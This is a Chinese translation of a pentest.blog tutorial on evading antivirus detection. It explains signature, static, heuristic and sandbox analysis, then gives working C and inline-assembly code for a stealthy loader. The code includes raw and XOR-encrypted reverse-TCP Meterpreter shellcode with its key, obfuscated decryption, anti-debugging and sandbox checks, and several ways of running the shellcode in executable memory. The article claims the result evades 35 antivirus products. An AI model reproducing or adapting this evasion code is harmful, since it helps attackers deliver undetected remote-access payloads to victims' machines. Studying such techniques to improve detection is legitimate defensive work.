> 原文链接: https://www.anquanke.com//post/id/85334 


# 【技术分享】反侦测的艺术part1：介绍AV和检测的技术


                                阅读量   
                                **148576**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：pentest.blog
                                <br>原文地址：[https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/](https://pentest.blog/art-of-anti-detection-1-introduction-to-av-detection-techniques/)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p3.ssl.qhimg.com/t014aa61df5adc76888.jpg)](https://p3.ssl.qhimg.com/t014aa61df5adc76888.jpg)**

**翻译：**[**myswsun******](http://bobao.360.cn/member/contribute?uid=2775084127)

**预估稿费：200RMB**

**<strong><strong>投稿方式：发送邮件至**[**linwei#360.cn**](mailto:linwei@360.cn)**，或登陆**[**网页版**](http://bobao.360.cn/contribute/index)**在线投稿**</strong></strong>

****

**<br>**

**传送门**

[**【技术分享】反侦测的艺术part2：精心打造PE后门（含演示视频）******](http://bobao.360.cn/learning/detail/3407.html)

[**【技术分享】反侦测的艺术part3：shellcode炼金术**](http://bobao.360.cn/learning/detail/3589.html)

**<br>**

**0x00 前言**

本文将要介绍一些有效的绕过最新的杀软的静态、动态和启发式分析的方法。一些方法已经为公众所熟知，但是还是有一些方法和实现技巧是实现绕过检测的关键。恶意程序的文件大小几乎是对抗检测，所以实现这些技巧时我将尽量保持文件大小足够小。本文也介绍了了杀软和windows操作系统的内部实现，读者应该至少有比较好的C/C++和汇编基础，同时有大致的PE文件结构的认知。

实现对抗检测的技术应该适用于任何类型的恶意程序，本文所有的方法适用于各种各样的恶意程序，但是本文主要关注stager meterpreter有效载荷，因为它能够做其他恶意程序所做的所有事，在远程机器上能够提权，盗取证书，进程转移，注册表操作和漏洞利用，并且meterpreter非常活跃并受安全研究员关注。

<br>

**0x01 检测技术手段**

**基于特征的检测：**

传统杀软严重依赖特征来识别恶意程序。

实际上，当杀软公司拿到了恶意程序时，它们由病毒分析师或动态分析系统分析。然后一旦被确定为是恶意的，就提取一个合适的特征，并把特征加入特征库。

**静态分析：**

静态分析不执行程序。

在大部分情况是通过[source code](https://en.wikipedia.org/wiki/Source_code)分析，也有一些情况通过[object code](https://en.wikipedia.org/wiki/Object_code)分析。

**动态分析：**

动态分析通过在一个真实的或虚拟机的机器上面执行软件进行分析。为了使动态分析更加高效，通常被执行的程序需要足够多的输入来产生有效的行为。

**沙盒：**

在计算机安全中，沙盒是一种隔离运行程序的机制。他经常用来执行未受测试或不受信任的程序或代码，这些程序或代码可能来自不受信任的第三方组织，个人或网站。在沙盒中执行将不会对主机或操作系统造成危害。

**启发式分析：**

启发式分析是一种被杀软公司设计用于检测先前未知的病毒的方法。启发式分析基于专家分析，使用各种决策规则或权重的方法来确定系统对特定威胁/风险的敏感性。MultiCriteria分析是权重的一种方法。启发式分析不同于只基于程序自身数据的静态分析。

**熵值：**

在计算中，熵是由操作系统或应用收集的用于在密码术或需要随机数据的其他用途中使用的随机性。这种随机性经常来自于硬件资源，或者已存在的东西如鼠标移动或专门的随机发生器。缺乏熵可能对性能和安全性产生负面影响。实现对抗检测的技术应该适用于任何类型的恶意程序，本文所有的方法适用于各种各样的恶意程序，但是本文主要关注stager meterpreter有效载荷，因为它能够做其他恶意程序所做的所有事，在远程机器上能够提权，盗取证书，进程转移，注册表操作和漏洞利用，并且meterpreter非常活跃并受安全研究员关注。

<br>

**0x02 常用的对抗技术**

为了降低被检测的几率，首先想到的是就是加密，加壳和代码混淆。这些工具和技术一直是绕过一些杀软产品的手段，但是由于安全领域的进步大多数工具和方法已经失效。为了理解这些工具和技术，我做了以下简短的说明。

**混淆：**

代码混淆被定义为在不影响实际功能的情况下打乱二进制代码，它将加大静态分析的难度，同时改变了二进制中的哈希特征。混淆可以通过简单的添加几行垃圾指令或者改变指令执行的顺序实现。这个方法能够绕过多少杀软取决于你混淆的程度。

**加壳：**

可执行文件的加壳是指压缩可执行文件的数据，并将解压缩代码和压缩数据组合存放与一个可执行文件中。当压缩的可执行文件被执行时，解压缩代码从压缩代码中重建原始的代码并执行。在大多数情况下，这是透明地发生，所以压缩的可执行文件可以使用与原始完全相同的方式。当杀软扫描程序扫描一个加壳的恶意程序时需要确认使用的压缩算法并解压。因为在加壳的情况下分析困难。

**加密：**

加密二进制文件，加大分析和反汇编的难度。一个加密器包含两部分，builder和stub。Builder简单的加密二进制文件并将它放入stub中，stub是加密器最重要的一个环节，当执行时stub首先被执行，并将原始二进制解密到内存中，然后在内存中执行二进制。

[![](https://p0.ssl.qhimg.com/t0152011c947cfebf0e.png)](https://p0.ssl.qhimg.com/t0152011c947cfebf0e.png)

<br>

**0x03 加壳和加密的问题**

在学习更有效的方法之前，对这些常用的技术的错误认识需要被注意到。如今的杀软已经不止搜索恶意程序的特征和行为，同时也搜索加壳和加密的特征。与检测恶意程序相比，检测加密和加壳相对容易，因为他们必须做一些可以的事比如解密文件并在内存中执行。

**PE注入：**

为了解释PE映像怎么在内存中执行，我将不得不讨论下windows如何加载PE文件。通常编译器编译PE文件时指定了主模块基址为0x00400000，全地址指针、长跳转指令的地址都得根据基址计算。当包含重定位节时，重定位节包含依赖基地址的指令。

当执行PE文件时，操作系统校验PE映像的优先的地址空间的有效性，如果优先地址不可靠，操作系统将在内存中随机选一个可靠的地址加载，在启动前需要调整地址，并根据重定位节重定位地址，然后启动挂起的进程。

为了在内存中执行PE映像，加密器需要解析PE头，重定位地址，不得不模仿系统的行为是不常见且可疑的。当我们分析用C或更高等级的语言编写的加密器时，大部分情况能够看见API函数“NtUnmapViewOfSection”和“ZwUnmapViewOfSection”的调用。这些函数用来在进程中卸载映像。他们在内存中执行PE的方法中扮演了很重要的角色。



```
xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
```

当然杀软也不能声称每个用这些函数的程序都有问题，但是威胁的可能性会大一点。很少有加密器（尤其是汇编编写的）不使用这些函数和手动重定位。

另一点加密文件会导致熵值升高，将加大被杀软标记其威胁的可能性。

[![](https://p3.ssl.qhimg.com/t0191c1691dba893466.png)](https://p3.ssl.qhimg.com/t0191c1691dba893466.png)

**完美的方法**

加密恶意代码的策略是明智的，但是解密函数应该适当的被混淆，同时在内存中执行被解密的代码时不做重定位操作，还必须有检测机制判断是否在沙盒运行，如果检测到在被杀软分析解密函数应该不执行。不加密整个PE文件，只加密shellcode或者.text节，这能保持低熵和小文件同时不改变映像头和节。

下面是执行流图。

[![](https://p0.ssl.qhimg.com/t014e6da8e281552e63.png)](https://p0.ssl.qhimg.com/t014e6da8e281552e63.png)

AV Detect”功能将用来检测是否在沙盒中运行，如果检测到杀软的特征将再次调用主功能模块或者崩溃，否则进入“Decrypt Shellcode”模块。

下面是反向tcp shellcode的原始格式。



```
unsigned char Shellcode[] = `{`
0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64,
0x8b, 0x50, 0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28,
0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c,
0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52, 0x57, 0x8b, 0x52,
0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,
0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49,
0x8b, 0x34, 0x8b, 0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01,
0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75,
0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b,
0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,
0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a,
0x8b, 0x12, 0xeb, 0x8d, 0x5d, 0x68, 0x33, 0x32, 0x00, 0x00, 0x68, 0x77,
0x73, 0x32, 0x5f, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0xb8,
0x90, 0x01, 0x00, 0x00, 0x29, 0xc4, 0x54, 0x50, 0x68, 0x29, 0x80, 0x6b,
0x00, 0xff, 0xd5, 0x6a, 0x05, 0x68, 0x7f, 0x00, 0x00, 0x01, 0x68, 0x02,
0x00, 0x11, 0x5c, 0x89, 0xe6, 0x50, 0x50, 0x50, 0x50, 0x40, 0x50, 0x40,
0x50, 0x68, 0xea, 0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x97, 0x6a, 0x10, 0x56,
0x57, 0x68, 0x99, 0xa5, 0x74, 0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0c,
0xff, 0x4e, 0x08, 0x75, 0xec, 0x68, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5,
0x6a, 0x00, 0x6a, 0x04, 0x56, 0x57, 0x68, 0x02, 0xd9, 0xc8, 0x5f, 0xff,
0xd5, 0x8b, 0x36, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x56, 0x6a,
0x00, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0x53, 0x6a, 0x00,
0x56, 0x53, 0x57, 0x68, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x01, 0xc3,
0x29, 0xc6, 0x75, 0xee, 0xc3
`}`;
```

为了保证合适的熵和大小，我将用异或简单加密，异或不是像RC4或者blowfish的加密方式，我们也不需要强加密。杀软不会试图解密shellcode，同时也使得静态分析困难。用异或加密速度快，避免加密库降低文件大小。

异或加密后的shellcode。



```
unsigned char Shellcode[] = `{`
0xfb, 0xcd, 0x8d, 0x9e, 0xba, 0x42, 0xe1, 0x93, 0xe2, 0x14, 0xcf, 0xfa,
0x31, 0x12, 0xb1, 0x91, 0x55, 0x29, 0x84, 0xcc, 0xae, 0xc9, 0xf3, 0x32,
0x08, 0x92, 0x45, 0xb8, 0x8b, 0xbd, 0x2d, 0x26, 0x66, 0x59, 0x0d, 0xb2,
0x9a, 0x83, 0x4e, 0x17, 0x06, 0xe2, 0xed, 0x6c, 0xe8, 0x15, 0x0a, 0x48,
0x17, 0xae, 0x45, 0xa2, 0x31, 0x0e, 0x90, 0x62, 0xe4, 0x6d, 0x0e, 0x4f,
0xeb, 0xc9, 0xd8, 0x3a, 0x06, 0xf6, 0x84, 0xd7, 0xa2, 0xa1, 0xbb, 0x53,
0x8c, 0x11, 0x84, 0x9f, 0x6c, 0x73, 0x7e, 0xb6, 0xc6, 0xea, 0x02, 0x9f,
0x7d, 0x7a, 0x61, 0x6f, 0xf1, 0x26, 0x72, 0x66, 0x81, 0x3f, 0xa5, 0x6f,
0xe3, 0x7d, 0x84, 0xc6, 0x9e, 0x43, 0x52, 0x7c, 0x8c, 0x29, 0x44, 0x15,
0xe2, 0x5e, 0x80, 0xc9, 0x8c, 0x21, 0x84, 0x9f, 0x6a, 0xcb, 0xc5, 0x3e,
0x23, 0x7e, 0x54, 0xff, 0xe3, 0x18, 0xd0, 0xe5, 0xe7, 0x7a, 0x50, 0xc4,
0x31, 0x50, 0x6a, 0x97, 0x5a, 0x4d, 0x3c, 0xac, 0xba, 0x42, 0xe9, 0x6d,
0x74, 0x17, 0x50, 0xca, 0xd2, 0x0e, 0xf6, 0x3c, 0x00, 0xda, 0xda, 0x26,
0x2a, 0x43, 0x81, 0x1a, 0x2e, 0xe1, 0x5b, 0xce, 0xd2, 0x6b, 0x01, 0x71,
0x07, 0xda, 0xda, 0xf4, 0xbf, 0x2a, 0xfe, 0x1a, 0x07, 0x24, 0x67, 0x9c,
0xba, 0x53, 0xdd, 0x93, 0xe1, 0x75, 0x5f, 0xce, 0xea, 0x02, 0xd1, 0x5a,
0x57, 0x4d, 0xe5, 0x91, 0x65, 0xa2, 0x7e, 0xcf, 0x90, 0x4f, 0x1f, 0xc8,
0xed, 0x2a, 0x18, 0xbf, 0x73, 0x44, 0xf0, 0x4b, 0x3f, 0x82, 0xf5, 0x16,
0xf8, 0x6b, 0x07, 0xeb, 0x56, 0x2a, 0x71, 0xaf, 0xa5, 0x73, 0xf0, 0x4b,
0xd0, 0x42, 0xeb, 0x1e, 0x51, 0x72, 0x67, 0x9c, 0x63, 0x8a, 0xde, 0xe5,
0xd2, 0xae, 0x39, 0xf4, 0xfa, 0x2a, 0x81, 0x0a, 0x07, 0x25, 0x59, 0xf4,
0xba, 0x2a, 0xd9, 0xbe, 0x54, 0xc0, 0xf0, 0x4b, 0x29, 0x11, 0xeb, 0x1a,
0x51, 0x76, 0x58, 0xf6, 0xb8, 0x9b, 0x49, 0x45, 0xf8, 0xf0, 0x0e, 0x5d,
0x93, 0x84, 0xf4, 0xf4, 0xc4
`}`;

unsigned char Key[] = `{`
0x07, 0x25, 0x0f, 0x9e, 0xba, 0x42, 0x81, 0x1a
`}`;
```

因为是新写的代码，所以hash特征不会被检测到。最重要的是我们要绕过动态分析，这个取决于“AV detect”模块。在写这个摸块前我们理解下启发式引擎的工作模式。

**启发式引擎**

启发式引擎是基于统计和规则的分析机制。他们主要的目的是检测事先未知的病毒，同时根据预定义的标准给出威胁等级，甚至当一个hello world程序被扫描时，如果大于他们定义的威胁阀值，也会被认定为威胁。启发式引擎是杀软产品中最高级的部分，基于大量的规则和指标，因此没有哪家杀软会发布关于他们自己的启发式引擎的文档，我们所有发现的威胁等级策略可能都是错误的。

一些已知的威胁等级规则如下：

解密过程检测

读取当前计算机名

读取机器的GUID

连接随机域名

读取windows安装日期

释放可执行文件

在二进制文件内存中发现IP地址

修改代理设置

在运行的进程中安装钩子

注入explorer

注入远程进程

查询进程信息

设置过程错误模式以抑制错误框

不正常的熵

检测杀软的存在性

监控指定的注册表项的改变

包含提权的能力

修改软件策略设置

读取系统或视频的BIOS版本

PE头的终点在一个不常用的节中

创建受保护的内存区域

创建大量进程

尝试长时间睡眠

不常用的节

读取windows产品ID

包含解密

包含启动或操作设备驱动的能力

包含阻止用户输入的能力

。。。

当我们编写检测杀软和解密shellcode模块时需要注意这些规则。

**解密shellcode：**

混淆解密机制是必要的，大部分杀软的启发式引擎能够检测到PE文件内部的解密循环，在大量的勒索软件的案例后一些启发式引擎专门用来查找加解密过程。在它们检测到解密过程时一些扫描器会等到ECX寄存器为0时，再分析解密后的内容。

下面是解密shellcode的代码。



```
void DecryptShellcode() `{`
for (int i = 0; i &lt; sizeof(Shellcode); i++) `{`

__asm
`{`
PUSH EAX
XOR EAX, EAX
JZ True1
__asm __emit(0xca)
__asm __emit(0x55)
__asm __emit(0x78)
__asm __emit(0x2c)
__asm __emit(0x02)
__asm __emit(0x9b)
__asm __emit(0x6e)
__asm __emit(0xe9)
__asm __emit(0x3d)
__asm __emit(0x6f)
True1:
POP EAX
`}`
Shellcode[i] = (Shellcode[i] ^ Key[(i % sizeof(Key))]);


__asm
`{`
PUSH EAX
XOR EAX, EAX
JZ True2
__asm __emit(0xd5)
__asm __emit(0xb6)
__asm __emit(0x43)
__asm __emit(0x87)
__asm __emit(0xde)
__asm __emit(0x37)
__asm __emit(0x24)
__asm __emit(0xb0)
__asm __emit(0x3d)
__asm __emit(0xee)
True2:
POP EAX
`}`
`}`
`}`
```

用一个for循环完成异或操作，上面和下面的汇编代码块不做任何事，它们只是一些随机的异或操作和跳转。因为我们没有用其他高级的解密机制，这对于混淆解密过程来说已经足够了。

**动态分析检测：**

写沙盒检测机制的时候我们也需要混淆我们的函数，如果启发式引擎检测到任何反汇编的方法将是糟糕的。

**检测调试器：**

第一种检测机制是检查我们的进程是否被调试。

有一个函数直接判断调用者所在的进程是否被用户态调试器调试。但是我们不用它，因为大部分杀软会监控这个API的调用。我们通过PEB结构中的“BeingDebuged”字段来判断。



```
// bool WINAPI IsDebuggerPresent(void);
__asm
`{`
CheckDebugger:
PUSH EAX // Save the EAX value to stack
MOV EAX, DWORD PTR FS : [0x18] // Get PEB structure address
MOV EAX, DWORD PTR[EAX + 0x30] // Get being debugged byte
CMP BYTE PTR[EAX + 2], 0 // Check if being debuged byte is set
JNE CheckDebugger // If debugger present check again
POP EAX // Put back the EAX value
`}`
```

通过上述代码，如果检测到调试器她将一直检测知道堆栈溢出，将触发异常导致进程退出。检测BeingDebuged字节将能绕过大量的杀软，但是还是有一些杀软能够处理这种情况，因此我们需要混淆上述代码。



```
__asm
`{`
CheckDebugger:
PUSH EAX
MOV EAX, DWORD PTR FS : [0x18]
__asm
`{`
PUSH EAX
XOR EAX, EAX
JZ J
__asm __emit(0xea)
J:
POP EAX
`}`
MOV EAX, DWORD PTR[EAX + 0x30]
__asm
`{`
PUSH EAX
XOR EAX, EAX
JZ J2
__asm __emit(0xea)
J2:
POP EAX
`}`
CMP BYTE PTR[EAX + 2], 0
__asm
`{`
PUSH EAX
XOR EAX, EAX
JZ J3
__asm __emit(0xea)
J3:
POP EAX
`}`
JNE CheckDebugger
POP EAX
`}`
```

添加了一些跳转指令不会影响到我们的功能，但是可以混淆代码，避免检测。

**加载假的dll：**

我们将尝试加载一个不存在的dll。正常的话我们将得到的是NULL返回值，但是一些动态分析机制会允许这种情况，为了进一步观察程序的执行情况。



```
bool BypassAV(char const * argv[]) `{`
HINSTANCE DLL = LoadLibrary(TEXT("fake.dll"));
if (DLL != NULL) `{`
BypassAV(argv);
`}`
```

**Get Tick Count：**

在这个方法中我们将利用检测的截止时间。在大部分情况下扫描器是为终端用户设计的，他们需要友好的体验，所以不能够花非常多的时间来扫描文件。之前都是使用Sleep()函数来等待扫描结束，但是如今这种方法几乎失效了，所有杀软都会跳过睡眠时间。为了对抗这种情况，调用下面的API “GetTickCount”能够返回自系统启动时的微秒数。我们用它获取时间，然后睡眠1秒钟，在调用获取时间，如果时间差小于1秒即为被检测。



```
int Tick = GetTickCount();
Sleep(1000);
int Tac = GetTickCount();
if ((Tac - Tick) &lt; 1000) `{`
return false;
`}`
```

**核心数目：**

这个方法非常简单，检查系统的处理器核心数。因为杀软产品不允许占用太多主机系统的资源。大部分沙盒系统只会分配1个核心。



```
SYSTEM_INFO SysGuide;
GetSystemInfo(&amp;SysGuide);
int CoreNum = SysGuide.dwNumberOfProcessors;
if (CoreNum &lt; 2) `{`
return false;
`}`
```

**大内存分配：**

这个方法同样利用杀软的扫描截止时间，简单的分配100Mb的内存，用0填充，最后释放。



```
char * Memdmp = NULL;
Memdmp = (char *)malloc(100000000);
if (Memdmp != NULL) `{`
memset(Memdmp, 00, 100000000);
free(Memdmp);
`}`
```

当内存开始增长时会触发杀软产品结束扫描，从而不会在一个文件上消耗太多时间。这个方法被用了很多次。这是个非常原始的方法。

**Trap标记：**

Trap标记用来跟踪程序。如果这个标记被设置为每个指令将触发“SINGLE_STEP”异常。Trap标记能够阻止跟踪。



```
__asm
`{`
PUSHF // Push all flags to stack
MOV DWORD [ESP], 0x100 // Set 0x100 to the last flag on the stack
POPF // Put back all flags register values 
`}`
```

**互斥量触发WinExec：**

这个方法非常简单，我们创建一个条件判断互斥量存在与否。



```
HANDLE AmberMutex = CreateMutex(NULL, TRUE, "FakeMutex");
if(GetLastError() != ERROR_ALREADY_EXISTS)`{`
WinExec(argv[0],0);
`}`
```

如果“CreateMutex”函数没有返回已存在，我们将再次执行恶意程序，因为大部分杀软产品不会让正在分析的程序启动新进程和访问沙盒以外的文件。当已经存在的错误出现时，解密函数已经执行了。有很多互斥量的方法在对抗检测方面很有效。

**合适的方法执行shellcode**

从windows vista开始，微软引入了DEP的机制。监控程序正常使用系统内存。如果任何不正常的使用方式将触发DEP，关闭程序并通知你。这意味着我们不能把字节序列放入字符数组中执行，你需要分配一块可读写可执行的内存。

微软有几种内存函数可以实现内存分配，大部分使用“VirtualAlloc”函数，因为你能猜到常用函数的使用将帮助杀软产品的检测，用其他内存函数也能达到效果，但是可能引起更少的注意。

下面是一些内存操作函数的用法。

HeapCreate/HeapAlloc:

Windows允许创建可读写可执行的堆区域。



```
void ExecuteShellcode()`{`
HANDLE HeapHandle = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sizeof(Shellcode), sizeof(Shellcode));
char * BUFFER = (char*)HeapAlloc(HeapHandle, HEAP_ZERO_MEMORY, sizeof(Shellcode));
memcpy(BUFFER, Shellcode, sizeof(Shellcode));
(*(void(*)())BUFFER)(); 
`}`
```

**LoadLibrary/GetProcAddress：**

这种组合能够调用任何函数，又不直接调用内存分配函数，引起注意较小。



```
void ExecuteShellcode()`{`
HINSTANCE K32 = LoadLibrary(TEXT("kernel32.dll"));
if(K32 != NULL)`{`
MYPROC Allocate = (MYPROC)GetProcAddress(K32, "VirtualAlloc");
char* BUFFER = (char*)Allocate(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(BUFFER, Shellcode, sizeof(Shellcode));
(*(void(*)())BUFFER)(); 
`}`
`}`
```

**GetModuleHandle/GetProcAddress:**

这种方法不用Loadibrary，充分利用已经加载的kernel32.dll，GetModuleHandle能够返回已加载的dll的模块句柄，这方法可能是执行shellcode最安静的方式。



```
void ExecuteShellcode()`{`
MYPROC Allocate = (MYPROC)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
char* BUFFER = (char*)Allocate(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(BUFFER, Shellcode, sizeof(Shellcode));
(*(void(*)())BUFFER)(); 
`}`
```

**多线程**

逆向分析多线程一直都是困难的，同时也挑战杀软。多线程的方法用在上述所有的方法中，而不是直接指向shellcode。创建线程执行shellcode。



```
void ExecuteShellcode()`{`
char* BUFFER = (char*)VirtualAlloc(NULL, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
memcpy(BUFFER, Shellcode, sizeof(Shellcode));
CreateThread(NULL,0,LPTHREAD_START_ROUTINE(BUFFER),NULL,0,NULL);
while(TRUE)`{`
BypassAV(argv);
`}` 
`}`
```

在上述代码中创建了新线程执行shellcode，在创建线程后用一个死循环绕过杀软检测，这种方法是一种双保险，既绕过了沙盒系统又绕过了动态分析。绕过一些启发式引擎也是有效的。

<br>

**0x04 总结**

最后，当编译恶意程序时更多想法需要被注意到，堆栈保护需要开启，去除符号可以加大逆向的难度，降低文件大小，本文内联汇编的语法推荐用visual studio编译。

我们的方法组合起来生成的恶意程序能够绕过35个杀软产品。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t019e7ee290b0c96dad.png)



****

**传送门**

[**【技术分享】反侦测的艺术part2：精心打造PE后门（含演示视频）******](http://bobao.360.cn/learning/detail/3407.html)

[**【技术分享】反侦测的艺术part3：shellcode炼金术**](http://bobao.360.cn/learning/detail/3589.html)

[********](http://bobao.360.cn/learning/detail/3407.html)
